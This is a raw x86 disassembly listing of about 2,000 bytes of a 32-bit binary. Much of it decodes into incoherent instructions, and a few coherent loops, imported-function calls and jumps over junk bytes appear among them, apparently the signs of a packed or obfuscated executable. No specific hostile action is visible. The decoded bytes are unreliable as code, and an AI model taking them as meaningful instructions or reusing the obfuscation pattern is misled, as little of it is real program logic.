  407290:	ror    esp,1
  407292:	pop    eax
  407293:	es adc eax,0x543f5ade
  407299:	bound  esp,QWORD PTR [ebx]
  40729b:	push   esp
  40729c:	cmc    
  40729d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40729e:	sbb    cl,0x35
  4072a1:	jle    0x407278
  4072a3:	adc    bh,ah
  4072a5:	jne    0x407298
  4072a7:	daa    
  4072a8:	sbb    al,cl
  4072aa:	cmp    dl,cl
  4072ac:	loope  0x4072e3
  4072ae:	xor    bh,ah
  4072b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4072b1:	xor    BYTE PTR [eax+ebp*1-0x31],bl
  4072b5:	inc    esp
  4072b6:	push   0x97333b50
  4072bb:	adc    eax,0x47352b56
  4072c0:	mov    edx,DWORD PTR [ebp-0x20]
  4072c3:	mov    ebx,DWORD PTR [ebp-0x8]
  4072c6:	xor    edx,eax
  4072c8:	add    edx,ecx
  4072ca:	imul   edx,ebx
  4072cd:	cmp    edx,edi
  4072cf:	jbe    0x40619a
  4072d5:	pop    ebx
  4072d6:	jmp    0x407428
  4072db:	push   ds
  4072dc:	cld    
  4072dd:	dec    edi
  4072de:	or     ebp,DWORD PTR [ebp-0x27]
  4072e1:	jp     0x40728c
  4072e3:	adc    edi,0xa690f0c
  4072e9:	lods   al,BYTE PTR ds:[esi]
  4072ea:	popf   
  4072eb:	clc    
  4072ec:	sbb    BYTE PTR [esi+0x7e],bh
  4072ef:	and    edi,DWORD PTR [edi+0x7e]
  4072f2:	jle    0x407347
  4072f4:	mov    ds:0x4f467f48,eax
  4072f9:	outs   dx,DWORD PTR ds:[esi]
  4072fa:	jnp    0x4072c8
  4072fc:	cld    
  4072fd:	loop   0x4072a9
  4072ff:	push   ds
  407300:	xchg   DWORD PTR [bp+di+0x3a04],esi
  407305:	mov    ds:0x1ae14dd3,al
  40730a:	cli    
  40730b:	jmp    0xf176df5
  407310:	add    eax,0x55cd3c38
  407315:	je     0xf389f100
  40731b:	sbb    DWORD PTR [eax],esi
  40731d:	cwde   
  40731e:	push   esi
  40731f:	mov    ah,0xdb
  407321:	sbb    bl,BYTE PTR [eax-0x5f]
  407324:	ins    DWORD PTR es:[edi],dx
  407325:	add    al,0xf9
  407327:	and    eax,0x784d6540
  40732c:	push   ecx
  40732d:	jge    0x4072f0
  40732f:	aas    
  407330:	ins    DWORD PTR es:[edi],dx
  407331:	data16 mov dl,0x14
  407334:	rcl    ah,0xfb
  407337:	pop    esi
  407338:	call   0x75a4:0xc9816232
  40733f:	push   ebp
  407340:	in     al,dx
  407341:	sbb    BYTE PTR [ebx],bl
  407343:	sbb    al,0xab
  407345:	mov    al,0x4f
  407347:	jg     0x407305
  407349:	xor    eax,0x77cc0656
  40734e:	add    BYTE PTR [esi],0x66
  407351:	mov    es,WORD PTR cs:[esi]
  407354:	mov    dl,0x8f
  407356:	adc    dl,BYTE PTR [eax+0x4997e8fd]
  40735c:	xor    eax,0xcdc94952
  407361:	and    bl,BYTE PTR [edi+0x58f83dd6]
  407367:	lock jl 0x4073a0
  40736a:	sar    DWORD PTR [edi],1
  40736c:	add    BYTE PTR [esp+eax*1-0x746257b9],ch
  407373:	xchg   BYTE PTR [esp+edi*4+0x32d1ea60],cl
  40737a:	aam    0x7b
  40737c:	inc    edx
  40737d:	xor    al,0x81
  40737f:	push   edx
  407380:	mov    dl,BYTE PTR [ecx]
  407382:	test   DWORD PTR [edx],esi
  407384:	jle    0x4073a2
  407386:	into   
  407387:	js     0x407379
  407389:	or     BYTE PTR ds:0x798d8a19,dl
  40738f:	sti    
  407390:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407391:	into   
  407392:	int    0x8a
  407394:	push   ebp
  407395:	mov    esp,?
  407397:	popf   
  407398:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407399:	push   ebp
  40739a:	inc    ebp
  40739b:	jg     0x4073fb
  40739d:	push   es
  40739e:	cmp    edi,DWORD PTR [edx+0x51]
  4073a1:	sub    eax,0xc1d25349
  4073a6:	sbb    eax,0x55045963
  4073ab:	cld    
  4073ac:	retf   
  4073ad:	dec    esi
  4073ae:	aad    0x6
  4073b0:	fbld   TBYTE PTR [eax]
  4073b2:	add    eax,0xe5f2d65c
  4073b7:	push   ebp
  4073b8:	popa   
  4073b9:	inc    cl
  4073bb:	idiv   BYTE PTR [eax]
  4073bd:	imul   edx,DWORD PTR [esp+esi*8-0x4da115ae],0x98c350fe
  4073c8:	jno    0x407402
  4073ca:	dec    edx
  4073cb:	inc    ecx
  4073cc:	or     ecx,DWORD PTR [eax-0x15]
  4073cf:	cmp    DWORD PTR [esi-0x30],esi
  4073d2:	mov    edi,0xa2d04b0d
  4073d7:	sub    al,0xc2
  4073d9:	call   0x372e31f5
  4073de:	popf   
  4073df:	xor    DWORD PTR [edi],edx
  4073e1:	push   ebp
  4073e2:	bound  edx,QWORD PTR [ebp+0x258c48d5]
  4073e8:	cld    
  4073e9:	xchg   esi,eax
  4073ea:	rcr    BYTE PTR [ebx],0x8b
  4073ed:	jns    0x4073d6
  4073ef:	mov    dh,0x3b
  4073f1:	push   cs
  4073f2:	or     al,0x5e
  4073f4:	or     BYTE PTR [esi+0x23ca482d],bl
  4073fa:	mov    ds:0x3243c203,eax
  4073ff:	or     ah,bl
  407401:	pushf  
  407402:	loop   0x407480
  407404:	mov    ds:0x5b8ec18b,eax
  407409:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40740a:	test   DWORD PTR [edx+0x78],ecx
  40740d:	test   eax,0x40666b2e
  407412:	stos   DWORD PTR es:[edi],eax
  407413:	push   ebx
  407414:	xchg   edi,eax
  407415:	gs mov eax,0x795fb60b
  40741b:	jno    0x407434
  40741d:	nop
  40741e:	repz push esi
  407420:	lds    edi,FWORD PTR [ebp+0x36d3bd14]
  407426:	cmp    DWORD PTR [edi+0x5f],0xffffffc9
  40742a:	ret    0x8
  40742d:	push   ebp
  40742e:	mov    ebp,esp
  407430:	jmp    0x4075bc
  407435:	jb     0x407447
  407437:	test   eax,0x8a95a91d
  40743c:	adc    DWORD PTR [ebp+eax*1-0x27f2d801],edi
  407443:	xchg   edi,eax
  407444:	inc    ecx
  407445:	lods   eax,DWORD PTR ds:[esi]
  407446:	sbb    DWORD PTR [esi+0x7e],edi
  407449:	jmp    0xadbef2cd
  40744e:	pop    ds
  40744f:	and    bl,BYTE PTR [edi+0xc]
  407452:	and    ah,dh
  407454:	loope  0x40748c
  407456:	das    
  407457:	xchg   esp,eax
  407458:	pop    ss
  407459:	jbe    0x407477
  40745b:	dec    esp
  40745c:	push   ebx
  40745d:	pop    ebp
  40745e:	cld    
  40745f:	rcr    ecx,0x82
  407462:	push   es
  407463:	push   0x6226d694
  407468:	cmp    BYTE PTR ds:0x34926432,dh
  40746e:	jge    0x407456
  407470:	adc    BYTE PTR [ecx+0x5eda598a],0x9a
  407477:	jl     0x4074b3
  407479:	mov    esp,?
  40747b:	jb     0x4073fd
  40747d:	xchg   ebp,eax
  40747e:	dec    ecx
  40747f:	imul   ecx,DWORD PTR [ebx],0xff8e858f
  407485:	xor    BYTE PTR [eax],0x46
  407488:	ja     0x407423
  40748a:	lea    esp,[edi+0xdf3c7b7]
  407490:	in     eax,dx
  407491:	mov    esp,0xb1b467a3
  407496:	cmp    al,0x46
  407498:	icebp  
  407499:	(bad)  [ecx+ebx*4-0x75]
  40749d:	pop    ss
  40749e:	arpl   cx,bx
  4074a0:	jno    0x4074db
  4074a2:	mov    cl,0x92
  4074a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074a5:	adc    cl,BYTE PTR ds:0x886857d2
  4074ab:	out    dx,eax
  4074ac:	mov    bh,0xde
  4074ae:	and    eax,0x6a076f0e
  4074b3:	arpl   WORD PTR [esi+0x2dc07f42],si
  4074b9:	aas    
  4074ba:	pop    es
  4074bb:	jmp    DWORD PTR [ebx]
  4074bd:	push   ss
  4074be:	jp     0x407508
  4074c0:	adc    al,0x98
  4074c2:	in     al,0xd6
  4074c4:	(bad)
  4074c8:	push   0x25
  4074ca:	(bad)  
  4074cc:	push   esp
  4074cd:	jns    0x4074f3
  4074cf:	mov    bh,0xab
  4074d1:	cdq    
  4074d2:	js     0x407550
  4074d4:	jmp    0xb40e536f
  4074d9:	add    al,0xc0
  4074db:	clc    
  4074dc:	sbb    al,0xf4
  4074de:	imul   eax,DWORD PTR [eax+0x2535df0f],0x6
  4074e5:	mov    esp,0xbb9ffb85
  4074ea:	cmp    al,0xd7
  4074ec:	out    0xd2,al
  4074ee:	add    al,0xbb
  4074f0:	stos   DWORD PTR es:[edi],eax
  4074f1:	rol    DWORD PTR [edx+eax*8-0x4375d6a7],1
  4074f8:	push   0x4e194b96
  4074fd:	sbb    al,0x93
  4074ff:	inc    ecx
  407500:	jno    0x407527
  407502:	scas   eax,DWORD PTR es:[edi]
  407503:	push   ds
  407504:	jmp    0xa465fa68
  407509:	and    ch,ah
  40750b:	adc    BYTE PTR [ebx+0x1e],bh
  40750e:	mov    ss,ebp
  407510:	inc    BYTE PTR [eax]
  407512:	ds push edi
  407514:	out    0xd7,al
  407516:	xchg   ebp,eax
  407517:	repnz cmp bl,BYTE PTR [esi+0xcd4ae6c]
  40751e:	les    ebp,FWORD PTR ds:0x5105d00c
  407524:	bound  edx,QWORD PTR [ebx-0x3a]
  407527:	fld    st(3)
  407529:	(bad)  
  40752a:	and    BYTE PTR [eax-0x5e],bh
  40752d:	push   edi
  40752e:	xchg   ebx,eax
  40752f:	xchg   eax,ecx
  407531:	adc    DWORD PTR [esi],esi
  407533:	mov    cl,0xdd
  407535:	dec    eax
  407536:	mov    eax,ds:0xd7f53048
  40753b:	js     0x407596
  40753d:	inc    ebp
  40753e:	stos   BYTE PTR es:[edi],al
  40753f:	sub    ch,bh
  407541:	(bad)  
  407542:	adc    al,0x73
  407544:	stc    
  407545:	ds es add al,0x64
  407549:	mov    al,0x47
  40754b:	test   DWORD PTR [ecx+0x557edc2c],0xc22cd4ce
  407555:	mov    al,BYTE PTR [ecx-0x7ac10758]
  40755b:	mov    edx,0x726dc217
  407560:	shr    DWORD PTR [esi+0x8],cl
  407563:	mov    DWORD PTR [edx+0x5],eax
  407566:	dec    esi
  407567:	mov    ecx,0x6fd71735
  40756c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40756d:	push   ecx
  40756e:	mov    ecx,ebx
  407570:	nop
  407571:	scas   al,BYTE PTR es:[edi]
  407572:	aam    0x23
  407574:	clc    
  407575:	ss sub cl,0xe3
  407579:	lock mov dh,0x90
  40757c:	out    0xbb,eax
  40757e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40757f:	and    BYTE PTR ss:[edx],bl
  407582:	push   edx
  407583:	sub    ecx,ecx
  407585:	dec    ebx
  407586:	and    DWORD PTR ds:0x1d35d49b,ebx
  40758c:	inc    ebp
  40758d:	sahf   
  40758e:	cmp    ah,BYTE PTR [ecx+0x2a]
  407591:	fmul   DWORD PTR [edx]
  407593:	pop    ebp
  407594:	xchg   DWORD PTR [ebx+0x6],eax
  407597:	arpl   WORD PTR [eax-0x43],ax
  40759a:	mov    dh,0xd4
  40759c:	jbe    0x407520
  40759e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40759f:	cmp    DWORD PTR [ebx],0xb6c12221
  4075a5:	ficomp WORD PTR [eax+ecx*2-0x2c]
  4075a9:	ds xor al,0x6d
  4075ac:	stc    
  4075ad:	sbb    eax,0x159d8a60
  4075b2:	neg    DWORD PTR [ecx-0x171fbd1]
  4075b8:	push   esp
  4075b9:	outs   dx,DWORD PTR ds:[esi]
  4075ba:	mov    dh,0xc7
  4075bc:	push   ecx
  4075bd:	push   ecx
  4075be:	and    DWORD PTR ds:0x41abce,0x0
  4075c8:	jmp    0x4075da
  4075cd:	mov    edx,DWORD PTR ds:0x41abce
  4075d3:	inc    edx
  4075d4:	mov    DWORD PTR ds:0x41abce,edx
  4075da:	cmp    DWORD PTR ds:0x41abce,0x1e
  4075e1:	jae    0x407619
  4075e7:	cmp    DWORD PTR ds:0x41abce,0x20
  4075ee:	jne    0x40760a
  4075f4:	push   DWORD PTR [ebp-0x28]
  4075f7:	push   0x365e
  4075fc:	push   DWORD PTR [ebp-0x18]
  4075ff:	push   0x4c62
  407604:	call   DWORD PTR ds:0x40d004
  40760a:	jmp    0x4075cd
  40760f:	xor    DWORD PTR ds:0x412374,0x3a52
  407619:	mov    eax,0xf89c8538
  40761e:	sub    ecx,ecx
  407620:	mov    DWORD PTR [ebp-0x8],eax
  407623:	and    DWORD PTR ds:0x41abd6,0x0
  40762d:	jmp    0x40763f
  407632:	mov    ecx,DWORD PTR ds:0x41abd6
  407638:	inc    ecx
  407639:	mov    DWORD PTR ds:0x41abd6,ecx
  40763f:	cmp    DWORD PTR ds:0x41abd6,0x1e
  407646:	jae    0x4076c6
  40764c:	cmp    DWORD PTR ds:0x41abd6,0x2d
  407653:	jne    0x40765f
  407659:	call   DWORD PTR ds:0x40d1d8
  40765f:	jmp    0x407632
  407664:	and    DWORD PTR ds:0x417e45,0x0
  40766e:	jmp    0x407680
  407673:	mov    edx,DWORD PTR ds:0x417e45
  407679:	inc    edx
  40767a:	mov    DWORD PTR ds:0x417e45,edx
  407680:	cmp    DWORD PTR ds:0x417e45,0x1b
  407687:	jae    0x4076c6
  40768d:	cmp    DWORD PTR ds:0x417e45,0x8
  407694:	jne    0x4076a5
  40769a:	push   0x41abea
  40769f:	call   DWORD PTR ds:0x40d1dc
  4076a5:	cmp    DWORD PTR ds:0x417e45,0x7
  4076ac:	jne    0x4076c1
  4076b2:	xor    edx,edx
  4076b4:	add    edx,DWORD PTR ds:0x417e45
  4076ba:	inc    edx
  4076bb:	mov    DWORD PTR ds:0x417e45,edx
  4076c1:	jmp    0x407673
  4076c6:	mov    DWORD PTR [ebp-0x4],0xf89c853b
  4076cd:	mov    edx,DWORD PTR [ebp-0x8]
  4076d0:	push   esi
  4076d1:	adc    esi,ecx
  4076d3:	mov    ecx,0x7510859
  4076d8:	xor    edx,ecx
  4076da:	mov    esi,0x32729f
  4076df:	push   edi
  4076e0:	mov    edi,DWORD PTR [ebp+0x10]
  4076e3:	add    edx,esi
  4076e5:	cmp    edi,edx
  4076e7:	jmp    0x407873
  4076ec:	iret   
  4076ed:	in     eax,0x74
  4076ef:	push   edx
  4076f0:	adc    al,0x63
  4076f2:	jns    0x40776d
  4076f4:	int    0x3e
  4076f6:	les    ebp,FWORD PTR [esi+0x26]
  4076f9:	stc    
  4076fa:	bound  edx,QWORD PTR [ecx]
  4076fc:	sbb    al,0x1f
  4076fe:	jle    0x40777e
  407700:	jmp    0xacbef584
  407705:	push   ecx
  407706:	mov    eax,ds:0x74fe2fbf
  40770b:	lods   eax,DWORD PTR ds:[esi]
  40770c:	clc    
  40770d:	sbb    al,BYTE PTR [ecx-0x61]
  407710:	(bad)  
  407711:	neg    BYTE PTR ds:0x60a31995
  407717:	mov    ah,0x91
  407719:	scas   al,BYTE PTR es:[edi]
  40771a:	mov    bh,0x60
  40771c:	aam    0xf
  40771e:	xchg   edi,eax
  40771f:	mov    bl,0xe7
  407721:	xor    DWORD PTR [eax+0x77],ebp
  407724:	add    ecx,DWORD PTR [esi+0x3ccfe33]
  40772a:	or     BYTE PTR [ebp+edx*1+0x7a5861e4],al
  407731:	mov    eax,ds:0x7ba0ce77
  407736:	call   0xab94fd9c
  40773b:	jo     0x4076e5
  40773d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40773e:	or     BYTE PTR [eax-0x7c],al
  407741:	and    edx,0x178135fc
  407747:	gs pushf 
  407749:	sahf   
  40774a:	push   ss
  40774b:	or     BYTE PTR [eax+0x10e969e0],0x9c
  407752:	cmc    
  407753:	and    BYTE PTR [ecx],dh
  407755:	cdq    
  407756:	out    0x81,al
  407758:	xor    edx,DWORD PTR [edi]
  40775a:	aas    
  40775b:	addr16 nop
  40775d:	jnp    0x40778a
  40775f:	sub    eax,0xd88ad33a
  407764:	or     DWORD PTR [edi+0x73],edi
  407767:	pop    ss
  407768:	(bad)  
  407769:	repnz xchg ebp,eax
  40776b:	fwait
  40776c:	xor    eax,eax
  40776e:	push   esp
  40776f:	icebp  
  407770:	je     0x40779a
  407772:	dec    edx
  407773:	xlat   BYTE PTR ds:[ebx]
  407774:	mov    bl,0x8
  407776:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407777:	sub    cl,al
  407779:	repnz (bad) 
  40777b:	(bad)  
  40777c:	sub    al,0x91
  40777e:	xor    esp,ebx
  407780:	repnz xor DWORD PTR [edi],ecx
  407783:	sbb    al,0x3d
  407785:	fisttp WORD PTR [edx+0x644b8bcf]
  40778b:	cmp    DWORD PTR [esi],ecx
  40778d:	jae    0x407723
  40778f:	push   0x22a0ae8c
  407794:	cmp    ch,bl
  407796:	clc    
  407797:	inc    edi
  407798:	iret   
  407799:	jl     0x407795
  40779b:	sti    
  40779c:	lahf   
  40779d:	and    esi,DWORD PTR [edi]
  40779f:	add    eax,DWORD PTR [edi-0x47]
  4077a2:	and    ebp,DWORD PTR [ebp-0xf]
  4077a5:	dec    esp
  4077a6:	test   DWORD PTR [ecx+ebp*4+0xd],ebx
  4077aa:	dec    ecx
  4077ab:	in     eax,0x2d
  4077ad:	repz (bad) 
  4077af:	hlt    
  4077b0:	dec    ebp
  4077b1:	xor    DWORD PTR [ebx+0x11],eax
  4077b4:	jge    0x407760
  4077b6:	sbb    BYTE PTR [edx],0x7d
  4077b9:	mov    gs,WORD PTR [edi]
  4077bb:	pop    es
  4077bc:	adc    al,0xce
  4077be:	fs inc ebp
  4077c0:	cmp    eax,ebp
  4077c2:	shr    ebp,0x5
  4077c5:	cmp    eax,0x9cca1c69
  4077ca:	push   0x2250ab6e
  4077cf:	mov    eax,0x86169ba9
  4077d4:	int3   
  4077d5:	add    BYTE PTR [ebp-0x1e36fef3],bl
  4077db:	sub    BYTE PTR [ebx+edx*2],bl
  4077de:	gs push ebx
  4077e0:	push   ebx
  4077e1:	das    
  4077e2:	pop    ebp
  4077e3:	test   esi,ebp
  4077e5:	cmp    al,0xe1
  4077e7:	push   eax
  4077e8:	pop    ecx
  4077e9:	fsubr  st,st(0)
  4077eb:	or     al,0x33
  4077ed:	jnp    0x40784f
  4077ef:	dec    esi
  4077f0:	out    dx,eax
  4077f1:	cmp    al,BYTE PTR [ebp+0x59]
  4077f4:	adc    eax,0xcd64ada4
  4077f9:	fsub   QWORD PTR [eax]
  4077fb:	pop    ds
  4077fc:	mov    esi,DWORD PTR [ebp+0x22ba86f6]
  407802:	ror    dl,cl
  407804:	push   esi
  407805:	in     eax,0x24
  407807:	dec    ebp
  407808:	mov    bl,ch
  40780a:	sub    DWORD PTR [ebx],eax
  40780c:	cli    
  40780d:	pop    esi
  40780e:	aad    0x55
  407810:	out    0x8f,al
  407812:	sub    ebx,DWORD PTR [eax-0x588f40e7]
  407818:	mov    ebp,0x57ae1f11
  40781d:	mov    ebp,0x100cd0dd
  407822:	or     al,0x54
  407824:	jmp    0x9f15:0x223810ce
  40782b:	pop    ebx
  40782c:	mov    BYTE PTR [edi+ecx*1-0x74],bl
  407830:	inc    eax
  407831:	popa   
  407832:	pusha  
  407833:	adc    eax,0xa0cb0a3
  407838:	fs repz shl cl,0x55
  40783d:	popf   
  40783e:	leave  
  40783f:	in     eax,0x96
  407841:	mov    ebx,0xf30a8d0a
  407846:	or     al,0xe7
  407848:	ins    DWORD PTR es:[edi],dx
  407849:	adc    eax,0x406117a5
  40784e:	pop    ecx
  40784f:	adc    ebp,DWORD PTR [edx]
  407851:	jne    0x4078a9
  407853:	sub    DWORD PTR [esi+0x4eb59a8d],eax
  407859:	dec    ebx
  40785a:	test   DWORD PTR [ebx-0x37b5d878],ebx
  407860:	frstor [ebp-0x20]
  407863:	call   DWORD PTR [eax-0x38dc52c5]
  407869:	jmp    0xd885:0xd8557312
  407870:	cli    
  407871:	jbe    0x40788d
  407873:	je     0x407c04
  407879:	jmp    0x407a05
  40787e:	in     eax,dx
  40787f:	(bad)  
  407880:	pop    esi
  407881:	jg     0x4078d7
  407883:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407884:	ins    DWORD PTR es:[edi],dx
  407885:	in     eax,0x5e
  407887:	imul   eax,DWORD PTR [esi-0x177e5a74],0xffffff89
  40788e:	(bad)  
  40788f:	sbb    al,0x7e
  407891:	jle    0x40787c
  407893:	jg     0x407913
  407895:	jle    0x40786f
  407897:	test   DWORD PTR [edx],esi
  407899:	ret    0xe168
  40789c:	xchg   edi,eax
  40789d:	and    bh,bh
  40789f:	adc    BYTE PTR [edx],0x46
  4078a2:	out    dx,eax
  4078a3:	leave  
  4078a4:	mov    bl,0xb0
  4078a6:	ds jecxz 0x40789c
  4078a9:	retf   
  4078aa:	shl    BYTE PTR [edx],0x7f
  4078ad:	jae    0x40783f
  4078af:	out    0x3d,al
  4078b1:	adc    BYTE PTR [ebx],al
  4078b3:	aad    0xfb
  4078b5:	sti    
  4078b6:	and    BYTE PTR [ebx+0x1df92f65],bh
  4078bc:	int3   
  4078bd:	in     al,0x8c
  4078bf:	leave  
  4078c0:	jo     0x4078c1
  4078c2:	mov    ecx,0x8c4a5a77
  4078c7:	xor    eax,0x5cacba5b
  4078cc:	push   eax
  4078cd:	add    al,0x15
  4078cf:	xor    cl,ch
  4078d1:	ss xchg ebx,eax
  4078d3:	mov    ds:0x9f121577,eax
  4078d8:	mov    al,ds:0x38dce8bb
  4078dd:	(bad)  
  4078de:	scas   al,BYTE PTR es:[edi]
  4078df:	jmp    0xfc1d:0x2d7decba
  4078e6:	cmp    cl,BYTE PTR [edi]
  4078e8:	mov    al,ds:0x411ce7ca
  4078ed:	jb     0x40792e
  4078ef:	aad    0x2e
  4078f1:	int3   
  4078f2:	sbb    DWORD PTR [bx+di+0xe],edi
  4078f6:	adc    eax,0xf1df1f14
  4078fb:	push   ss
  4078fc:	or     eax,0x391f922e
  407901:	mov    ebx,0xf76745fb
  407906:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407907:	sbb    esp,eax
  407909:	into   
  40790a:	lods   al,BYTE PTR ds:[esi]
  40790b:	push   0xffffff95
  40790d:	sahf   
  40790e:	loopne 0x40793e
  407910:	and    al,0xc7
  407912:	pop    ebp
  407913:	mov    bl,0xd9
  407915:	jns    0x407957
  407917:	sub    BYTE PTR [esp+eax*1-0x57],ch
  40791b:	pop    ecx
  40791c:	dec    esp
  40791d:	std    
  40791e:	inc    edi
  40791f:	push   ebp
  407920:	js     0x407909
  407922:	jmp    0xaa6cc620
  407927:	pop    ebp
  407928:	rol    DWORD PTR [edx+0xb],0xb6
  40792c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40792d:	push   ecx
  40792e:	fwait
  40792f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407930:	cmp    bl,BYTE PTR [ecx+0x5c]
  407933:	pusha  
  407934:	push   eax
  407935:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407936:	xor    eax,0x68a400b6
  40793b:	mov    ah,BYTE PTR [edx]
  40793d:	add    BYTE PTR [ecx-0x27a6e685],al
  407943:	sbb    bh,BYTE PTR [ebx]
  407945:	loopne 0x407927
  407947:	mov    edx,0x8e9e556f
  40794c:	inc    ecx
  40794d:	xor    BYTE PTR [edi],bh
  40794f:	int3   
  407950:	loope  0x407989
  407952:	mov    al,ds:0xee23b5e4
  407957:	and    ebp,DWORD PTR [ebp-0xe]
  40795a:	fcom   st(2)
  40795c:	xor    al,0x9c
  40795e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40795f:	scas   al,BYTE PTR es:[edi]
  407960:	shl    BYTE PTR [eax],1
  407962:	pop    eax
  407963:	cmp    DWORD PTR [ebx-0x8],esp
  407966:	neg    BYTE PTR [edi+edx*1]
  407969:	or     al,0xc0
  40796b:	mov    edx,0x621396af
  407970:	lods   eax,DWORD PTR ds:[esi]
  407971:	std    
  407972:	mov    DWORD PTR ds:0x4ecab91,ebx
  407978:	mov    al,0x61
  40797a:	push   ecx
  40797b:	push   ds
  40797c:	imul   DWORD PTR [esp+eiz*2+0xe6f943e]
  407983:	dec    ebp
  407984:	xor    esi,DWORD PTR [ebx+edi*2+0x1981a998]
  40798b:	cmp    dl,BYTE PTR [edx+0x34e8be7c]
  407991:	push   ds
  407992:	sti    
  407993:	push   ecx
  407994:	mov    DWORD PTR ds:0xb31ce356,ecx
  40799a:	ins    DWORD PTR es:[edi],dx
  40799b:	mov    bh,0x72
  40799d:	pushf  
  40799e:	push   ds
  40799f:	jnp    0x4079bc
  4079a1:	lahf   
  4079a2:	arpl   WORD PTR [eax],bp
  4079a4:	jo     0x407980
  4079a6:	push   eax
  4079a7:	mov    esi,0x47f4003e
  4079ac:	jns    0x407a27
  4079ae:	adc    dl,BYTE PTR [edx-0x5]
  4079b1:	add    cl,BYTE PTR [esi]
  4079b3:	fwait
  4079b4:	cdq    
  4079b5:	add    eax,0xe5743123
  4079ba:	ins    BYTE PTR es:[edi],dx
  4079bb:	sar    DWORD PTR cs:[edx+0x5fffeef3],1
  4079c2:	jl     0x407997
  4079c4:	ret    
  4079c5:	push   edi
  4079c6:	mov    eax,0xdb8c7f8c
  4079cb:	cmp    dl,BYTE PTR [ecx]
  4079cd:	imul   ecx,DWORD PTR [ebx],0xffffffa1
  4079d0:	sti    
  4079d1:	sar    dh,cl
  4079d3:	jnp    0x40798d
  4079d5:	cdq    
  4079d6:	push   eax
  4079d7:	jbe    0x40795b
  4079d9:	xor    BYTE PTR [ecx+ecx*8-0x7ce50330],dl
  4079e0:	inc    edx
  4079e1:	jl     0x407966
  4079e3:	fsub   st(6),st
  4079e5:	jbe    0x4079f0
  4079e7:	stos   DWORD PTR es:[edi],eax
  4079e8:	sbb    al,0x4e
  4079ea:	ins    DWORD PTR es:[edi],dx
  4079eb:	push   ebx
  4079ec:	arpl   di,ax
  4079ee:	mov    esp,0x4aef4d13
  4079f3:	stc    
  4079f4:	(bad)  
  4079f5:	cmp    BYTE PTR [ecx+0x6e935634],ah
  4079fb:	ins    DWORD PTR es:[edi],dx
  4079fc:	sub    ebx,DWORD PTR [ecx]
  4079fe:	popf   
  4079ff:	fcmovb st,st(4)
  407a01:	repz xor BYTE PTR [edi-0x7aa7407],al
  407a08:	mov    eax,DWORD PTR [ebp-0x4]
  407a0b:	xor    eax,ecx
  407a0d:	mov    edi,0xffcd8d61
  407a12:	sub    edi,eax
  407a14:	jmp    0x407ba0
  407a19:	les    edi,FWORD PTR [eax]
  407a1b:	add    ch,BYTE PTR [edi-0x1e]
  407a1e:	gs jns 0x4079da
  407a21:	dec    esp
  407a22:	hlt    
  407a23:	sbb    BYTE PTR [ecx+0x7c],0xd
  407a27:	push   esp
  407a28:	xchg   edi,eax
  407a29:	jle    0x407a3d
  407a2b:	jle    0x407aab
  407a2d:	jmp    0x7abef8b1
  407a32:	jnp    0x4079ce
  407a34:	xor    eax,edi
  407a36:	mov    DWORD PTR [esi+0x64cf2da4],edx
  407a3c:	call   0x8db83acb
  407a41:	mov    eax,ds:0xfa259187
  407a46:	and    al,0x1e
  407a48:	inc    esp
  407a49:	retf   
  407a4a:	push   edi
  407a4b:	dec    ecx
  407a4c:	push   ebx
  407a4d:	sub    DWORD PTR [ebp-0x6ec54b7],eax
  407a53:	add    DWORD PTR [edx+ebx*4+0x65],esi
  407a57:	sahf   
  407a58:	mov    dh,0x24
  407a5a:	mov    ah,0xa3
  407a5c:	jbe    0x407a5c
  407a5e:	std    
  407a5f:	mov    ecx,0xb58ffbfd
  407a64:	xchg   esi,eax
  407a65:	inc    esp
  407a66:	dec    ebp
  407a67:	out    0x51,al
  407a69:	in     eax,0x55
  407a6b:	fs dec esi
  407a6d:	fwait
  407a6e:	or     al,0x42
  407a70:	push   0xc21cb9c9
  407a75:	mov    BYTE PTR [edi-0x2e241394],ah
  407a7b:	in     eax,dx
  407a7c:	xchg   esp,eax
  407a7d:	cdq    
  407a7e:	call   0x8ed2ae04
  407a83:	jge    0x407ad6
  407a85:	inc    ebx
  407a86:	imul   ecx,DWORD PTR [ecx],0x4eb3d885
  407a8c:	ret    0xd6f9
  407a8f:	repnz add eax,0x7dc6f5cd
  407a95:	adc    DWORD PTR [edi+0x6acce586],0x1ee33d36
  407a9f:	pushf  
  407aa0:	xchg   edi,eax
  407aa1:	pop    esi
  407aa2:	out    dx,eax
  407aa3:	mov    dl,0xff
  407aa5:	(bad)  
  407aa7:	test   BYTE PTR [ebx+0x776f15c0],bl
  407aad:	or     al,0x12
  407aaf:	mov    ds:0x8ac29705,eax
  407ab4:	in     eax,dx
  407ab5:	cdq    
  407ab6:	fs jecxz 0x407a9d
  407ab9:	popa   
  407aba:	and    DWORD PTR [edx+eax*2+0x221c389b],ecx
  407ac1:	jmp    0x4a011dc7
  407ac6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ac7:	leave  
  407ac8:	push   edx
  407ac9:	jnp    0x407a60
  407acb:	sbb    bh,BYTE PTR [ebp+0x52]
  407ace:	sub    ebx,DWORD PTR [ecx-0x64c6c92d]
  407ad4:	enter  0xd5d4,0x73
  407ad8:	mov    dl,0x5a
  407ada:	push   ds
  407adb:	call   0xc06726dc
  407ae0:	scas   eax,DWORD PTR es:[edi]
  407ae1:	in     al,dx
  407ae2:	push   ecx
  407ae3:	pop    edx
  407ae4:	cmp    eax,0xcb713a65
  407ae9:	inc    edx
  407aea:	dec    ecx
  407aeb:	dec    eax
  407aec:	xor    BYTE PTR ds:0xac6fffbf,0xe3
